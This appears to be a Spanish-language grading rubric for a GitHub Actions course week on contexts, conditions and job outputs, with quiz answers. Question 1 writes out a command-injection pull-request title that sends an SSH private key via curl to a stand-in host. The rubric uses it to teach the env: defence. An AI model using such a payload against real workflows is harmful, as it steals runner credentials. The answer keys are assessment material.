# Rúbrica de evaluación — Semana 02

> Expresiones, contextos y flujo de datos. Se aprueba con un **mínimo del 70 % en cada evidencia**,
> no en el promedio.

## 📊 Distribución de Evidencias

| Evidencia | Peso | Instrumento |
|---|:--:|---|
| 🧠 Conocimiento | 30% | 10 preguntas conceptuales, respuestas en `<details>` |
| 💪 Desempeño | 40% | Prácticas 01 a 04, verificadas por `checks.json` |
| 📦 Producto | 30% | Autograding + calidad manual de `ci.yml` |

## 🧠 Conocimiento (30%)

Responde por escrito antes de abrir cada respuesta. Cada pregunta vale 3 puntos: 1 por la idea
correcta y 2 por el razonamiento.

**1.** Estos dos steps imprimen el título de un pull request. Los dos funcionan con un título
normal. ¿Cuál es peligroso, por qué, y qué pasa si alguien abre un PR titulado
`x"; curl https://evil.example/$(cat ~/.ssh/id_rsa | base64) #`?

```yaml
- run: echo "Título: ${{ github.event.pull_request.title }}"
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Título: $TITLE"
```

<details>
<summary>Respuesta</summary>

El primero. `${{ }}` lo evalúa **GitHub antes de enviar el job al runner**, y el resultado se
pega como texto dentro del script. El shell recibe
`echo "Título: x"; curl https://evil.example/...  #"`: la comilla del título cierra la cadena,
el `;` empieza un comando nuevo y el `#` comenta el resto. El atacante ejecuta lo que quiera en tu
runner, con tu token.

En el segundo, `${{ }}` solo rellena una variable de entorno. El script que llega al shell es
siempre `echo "Título: $TITLE"`, y `$TITLE` lo expande bash **como dato**, sin volver a
interpretarlo como código. Por eso la regla del bootcamp es que los datos no confiables llegan al
shell por `env:`, y por eso lo comprueba `no-expressions-in-run`.

</details>

**2.** `${{ github.sha }}` y `$GITHUB_SHA` valen lo mismo en un step. ¿Por qué existen los dos y
cuándo solo te sirve uno de ellos?

<details>
<summary>Respuesta</summary>

Son el mismo dato en dos momentos distintos. `github.sha` es un **contexto**: lo resuelve GitHub
al evaluar la expresión, antes de que exista ningún shell. `$GITHUB_SHA` es una **variable de
entorno por defecto** que el runner define en la máquina y que solo un proceso en ejecución puede
leer.

Fuera de un `run:` no hay shell, así que en `if:`, `runs-on`, `env:` o `with:` solo sirve el
contexto. Dentro de un `run:` conviene la variable: es dato, no texto pegado en el script, y
`${GITHUB_SHA::7}` te deja recortarla con bash sin expresiones.

</details>

**3.** Escribes `runs-on: ${{ steps.pick.outputs.label }}` y actionlint lo rechaza. ¿Por qué no
puede funcionar, y qué contextos sí podrías usar ahí?

<details>
<summary>Respuesta</summary>

`runs-on` decide **en qué máquina** corre el job, así que se evalúa antes de asignar el runner.
En ese momento ningún step del job ha corrido: el contexto `steps` no existe todavía. Cada
contexto está disponible solo donde ya tiene valor; la tabla de disponibilidad de la
documentación lo detalla clave por clave.

En `runs-on` sí puedes usar los contextos que ya se conocen antes de empezar el job: `github`,
`needs` (si un job anterior calcula la etiqueta y la publica como output), `vars`, `inputs`,
`strategy` y `matrix`. La forma correcta de elegir la máquina en función de un cálculo es un job
previo con un output y `runs-on: ${{ needs.pick.outputs.label }}`.

</details>

**4.** Un job `deploy` tiene `needs: test` y añades `if: github.ref == 'refs/heads/main'`. Otro
compañero propone `if: always() && github.ref == 'refs/heads/main'` "para que no se salte".
¿Qué cambia y por qué es peligroso?

<details>
<summary>Respuesta</summary>

Un `if:` sin función de estado lleva un `success() &&` implícito delante: `deploy` solo corre si
`test` terminó bien **y** la rama es `main`. Con `always()` desaparece esa condición: `deploy`
corre aunque `test` haya fallado, e incluso si cancelaste el run. Estarías desplegando un commit
que no pasa los tests.

`always()` (y `!cancelled()`) son para jobs que tienen que ver el fallo, como un resumen o una
limpieza, nunca para jobs que publican o despliegan.

</details>

**5.** El job `summary` del proyecto usa `if: ${{ !cancelled() }}` y no `if: ${{ always() }}`.
¿Qué diferencia hay entre los dos y por qué se elige el primero?

<details>
<summary>Respuesta</summary>

Los dos hacen que el job corra aunque falle un job anterior. La diferencia está en la
**cancelación**: `always()` corre también cuando cancelas el run, y `!cancelled()` no.

Si cancelas un run es porque no quieres que siga, normalmente porque empujaste un commit nuevo. Un
resumen de un run cancelado no informa de nada y gasta minutos. La documentación recomienda
`!cancelled()` como alternativa y avisa de que `always()` en una tarea que puede quedarse colgada
deja el run esperando hasta su timeout. `!cancelled()` cubre el caso útil (ver qué falló) sin ese
coste.

</details>

**6.** Un step con `id: lint` y `continue-on-error: true` sale con código 1. El job sigue y termina
en verde. ¿Qué valen `steps.lint.outcome` y `steps.lint.conclusion`, y cuál usarías en un
`if:` posterior para avisar del fallo?

<details>
<summary>Respuesta</summary>

`outcome` es `failure`: es lo que pasó **antes** de aplicar `continue-on-error`. `conclusion` es
`success`: es el resultado **después**, el que cuenta para el job. Por eso el job sigue en verde.

Para avisar del fallo usa `if: steps.lint.outcome == 'failure'`. Con `conclusion` nunca verías el
fallo: `continue-on-error` lo ha convertido en éxito.

</details>

**7.** En un step escribes `echo "STAGE=build" >> "$GITHUB_ENV"` y en la línea siguiente del mismo
`run:` haces `echo "$STAGE"`, que sale vacío. ¿Por qué? Y ya que estás: ¿por qué GitHub retiró
`echo "::set-output name=x::valor"` en favor de estos archivos?

<details>
<summary>Respuesta</summary>

`$GITHUB_ENV` es un **archivo** que el runner lee cuando el step termina. Las variables que
escribes ahí se cargan en el entorno de los steps **siguientes** del mismo job, nunca en el step
actual (que ya tiene su entorno) ni en otros jobs (que corren en otras máquinas). Si la necesitas
en la misma línea, usa una variable de shell normal.

`::set-output` era un **comando que el runner buscaba en la salida estándar**. Cualquier proceso
que imprimiera texto no confiable (un log que muestra el título de un PR, la salida de un test)
podía colar ese comando y fijar outputs o estado a su gusto. Con `$GITHUB_OUTPUT` y
`$GITHUB_STATE`, solo escribe quien abre el archivo a propósito. Por eso `no-set-output` falla si
aparece en tus workflows.

</details>

**8.** El step `compute` del job `version` escribe `version=1.0.0+3d3c42e` en `$GITHUB_OUTPUT`. En
el job `summary`, `${{ steps.compute.outputs.version }}` sale vacío. ¿Por qué, y qué te falta?

<details>
<summary>Respuesta</summary>

`summary` corre en **otra máquina** y no tiene ningún step llamado `compute`: el contexto `steps`
solo ve los steps del job actual. Los outputs de step mueren con su job.

Para cruzar la frontera hay dos piezas explícitas. El job `version` tiene que declarar
`outputs: version: ${{ steps.compute.outputs.version }}`, y `summary` tiene que tener
`needs: version` para leer `${{ needs.version.outputs.version }}`. Se exige mapearlo a mano para
que un job solo exponga lo que decides publicar. Además, GitHub no envía un output de job que
contenga un secreto.

</details>

**9.** `structure` tiene un `if:` que resulta falso y se salta. `summary` tiene `needs: [structure]`
y ningún `if:`. ¿Qué le pasa a `summary`? ¿Y qué valen `needs.structure.result` y sus outputs si
`summary` tuviera `if: ${{ !cancelled() }}`?

<details>
<summary>Respuesta</summary>

Sin `if:`, `summary` lleva el `success()` implícito, que exige que todos sus `needs` hayan
terminado en `success`. Un job saltado no cuenta como éxito, así que `summary` **también se
salta**, y el salto se propaga por todo el grafo hacia abajo.

Con `!cancelled()`, `summary` sí corre. `needs.structure.result` vale `skipped` y cualquier
`needs.structure.outputs.*` es una cadena vacía, porque el job nunca se ejecutó. Por eso el
resumen del proyecto lee `result` de cada job en lugar de suponer que todos corrieron.

</details>

**10.** Guardas el nombre del proyecto en una variable de configuración (`vars.PROJECT_NAME`) y la
URL de un webhook en un secreto. ¿Qué diferencia hay entre los dos y por qué no guardarías la URL
del webhook en `vars`?

<details>
<summary>Respuesta</summary>

Las dos se definen en el repo o en la organización y se leen con una expresión, pero:

- **`vars`** es configuración en claro: cualquiera con acceso de lectura a los settings la ve, se
  puede leer con `gh variable get` y aparece tal cual en los logs.
- **`secrets`** se guarda cifrado, nadie puede volver a leerlo después de crearlo y el runner
  **enmascara** su valor en los logs (`***`). Además, no llega a los workflows de pull requests de
  forks.

La URL de un webhook da acceso: quien la tenga puede publicar en tu canal. Es una credencial, así
que va en `secrets`. `PROJECT_NAME` no da acceso a nada y conviene que se vea en los logs: va en
`vars`. Los secretos los verás a fondo en la Semana 13.

</details>

## 💪 Desempeño (40%)

| Práctica | Criterio | Puntos |
|---|---|:--:|
| 01 — Explorar contextos | Variable de configuración `PROJECT_NAME` creada con valor `tablero` (check `project-name-variable`) | 5 |
| 01 — Explorar contextos | `explore.yml` lanzado a mano y en verde (check `explore-dispatched`), sin volcar `toJSON(secrets)` ni el contexto `github` entero | 5 |
| 02 — Condiciones y estado | `conditions.yml` ejecutado (check `conditions-ran`) | 5 |
| 02 — Condiciones y estado | Sabe enseñar en `gh run view --json jobs` un step con `outcome` `failure` y `conclusion` `success`, y qué steps corrieron con `failure()` y `always()` | 5 |
| 03 — Outputs entre steps y jobs | `data-flow.yml` lanzado a mano y en verde (check `data-flow-dispatched`) | 5 |
| 03 — Outputs entre steps y jobs | Un output multilínea con delimitador y una variable en `$GITHUB_ENV` que solo ven los steps siguientes | 5 |
| 04 — Un pipeline con grafo | `graph.yml` lanzado a mano y en verde (check `graph-dispatched`) | 5 |
| 04 — Un pipeline con grafo | Sabe enseñar un run donde falla una rama del grafo, los dependientes se saltan y el job final corre con `!cancelled()` y escribe el resumen | 5 |
| **Total** | | **40** |

## 📦 Producto (30%)

**Autograding (12 puntos)**: `./scripts/check-week.sh 02` con 17/17. Cada comprobación en rojo
resta la parte proporcional (12/17 de punto).

**Calidad manual de `.github/workflows/ci.yml` (18 puntos)**:

| Criterio | Puntos |
|---|:--:|
| En `summary`, la versión, el nombre del proyecto y los resultados llegan al shell por `env:`, nunca con `${{ }}` dentro de `run:` | 4 |
| El resumen del run se lee sin abrir el log: título con proyecto y versión, y una tabla con el resultado de cada job | 3 |
| Un comentario junto a `defaults:` explica para qué se fija `bash` (qué gana con `pipefail`) | 3 |
| La versión sale solo del commit (`pyproject.toml` + SHA): el mismo commit da siempre la misma versión, sin fecha ni número de run | 3 |
| Ningún `TODO` en `.github/workflows/` | 2 |
| Commits en inglés con Conventional Commits (`ci: add version and summary jobs`) | 3 |
| **Total** | **18** |

### Penalizaciones

| Situación | Deducción |
|---|:--:|
| Secreto real comiteado o impreso en un log | Grave: Producto a 0 hasta rotarlo y retirarlo |
| `toJSON(secrets)` en cualquier workflow | Grave: Producto a 0 hasta retirarlo |
| `uses:` remota sin SHA | Grave: −10 |
| Workflow sin `permissions:` o con `write-all` | Grave: −10 |
| `${{ github.event.* }}`, `github.head_ref` o `inputs.*` interpolado dentro de `run:` | Grave: −10 |
| Imagen sin tag o con `latest` | Grave: −10 |
| `::set-output` o `::save-state` | −5 |
| `pip` o `npm` en cualquier workflow o script | −3 |
| `ubuntu-latest` | −2 <!-- antipatron --> |
| `TODO` sin resolver en la entrega | −1 por cada uno |

Vuelve al [README de la semana](README.md) para ver los entregables.

---

| ← Anterior | Siguiente → |
|:---|---:|
| [Proyecto: capa 02 de tablero](3-proyecto/README.md) | [eBooks gratuitos](4-recursos/ebooks-free/README.md) |
